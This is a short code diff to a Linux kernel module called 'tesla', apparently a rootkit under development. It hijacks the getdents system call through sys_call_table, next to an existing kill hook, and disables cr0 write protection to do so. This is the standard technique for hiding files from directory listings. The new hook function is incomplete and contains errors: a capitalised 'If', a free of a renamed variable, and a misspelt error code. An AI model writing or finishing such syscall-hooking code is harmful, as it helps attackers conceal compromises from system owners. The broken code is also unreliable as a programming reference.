@@ -21,11 +21,14 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 {
   int totalSize = orig_getdents(fd, dirp, count);
 
-  struct linux_dirent *kernelDirp = kmalloc(totalSize, GFP_KERNEL);
-  If (copy_from_user(kernelDirp, dirp, totalSize) != 0) {
+  struct linux_dirent *cDirp = kmalloc(totalSize, GFP_KERNEL);
+  If (copy_from_user(cDirp, dirp, totalSize) != 0) {
     kfree(kernelDirp);
     return -EACCESS;
   }
+
+  struct linux_dirent *nDirp = cDirp;
+  
 
     return 0;
 }
@@ -80,6 +83,10 @@ int tesla_init(void)
 	orig_kill = (void *)sys_call_table[__NR_kill];
 	sys_call_table[__NR_kill] = (long *)tesla_kill;
 
+	/* save the original getdents system call into orig_getdents, and replace the getdents call with tesla_getdents*/
+	orig_getdents = (void *)sys_call_table[__NR_getdents];
+	sys_call_table[__NR_getdents] = (long *)tesla_getdents;
+
 	/* set bit 16 of cr0, so as to turn the write protection on */
 
 	write_cr0(read_cr0() | 0x10000);
@@ -97,6 +104,9 @@ void tesla_exit(void)
 
 	/* restore the kill system call to its original version */
 	sys_call_table[__NR_kill] = (long *)orig_kill;
+
+	/* restore the getdents system call to its original version */
+	sys_call_table[__NR_getdents] = (long *)orig_getdents;
 
 	/* set bit 16 of cr0 */
 	write_cr0(read_cr0() | 0x10000);
